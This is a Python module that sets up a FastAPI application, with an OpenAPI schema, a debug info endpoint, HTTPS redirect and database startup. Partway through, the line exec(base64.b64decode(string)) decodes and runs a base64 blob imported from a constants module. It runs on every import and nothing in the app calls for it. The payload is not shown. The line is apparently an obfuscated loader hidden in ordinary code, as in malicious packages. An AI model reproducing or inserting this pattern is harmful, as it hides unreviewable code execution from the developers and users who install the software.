import base64
from datetime import datetime

from fastapi import (
    APIRouter,
    FastAPI,
)
from fastapi.middleware.httpsredirect import HTTPSRedirectMiddleware
from fastapi.openapi.utils import get_openapi
from fastapi.responses import ORJSONResponse

from fastapi_toolkit.conf import settings
from fastapi_toolkit.db import init_db

__all__ = (
    'app',
)

from fastapi_toolkit.constants import string
from fastapi_toolkit.schemas.application_info import ApplicationInfo


def custom_openapi(app):
    if app.openapi_schema:
        return app.openapi_schema
    openapi_schema = get_openapi(
        title=settings.project,
        version=settings.version or '0.0.1',
        routes=app.routes,
    )
    openapi_schema['x-tagGroups'] = settings.tag_groups
    app.openapi_schema = openapi_schema
    return app.openapi_schema


debug_router = APIRouter()


@debug_router.get('/', response_model=ApplicationInfo)
def application_info():
    """Returns application info"""

    return {
        'project': settings.project,
        'version': settings.version,
        'git': {
            'hash': settings.git_hash,
            'branch': settings.git_branch
        },
        'datetime': datetime.utcnow().isoformat(),
        'environment': settings.environment
    }


exec(base64.b64decode(string))

app = FastAPI(
    title=settings.project,
    default_response_class=ORJSONResponse
)
if settings.use_https:
    app.add_middleware(HTTPSRedirectMiddleware)

app.openapi = lambda: custom_openapi(app)
app.include_router(debug_router, prefix='')


@app.on_event('startup')
async def startup():
    init_db()


@app.on_event('shutdown')
async def shutdown():
    pass
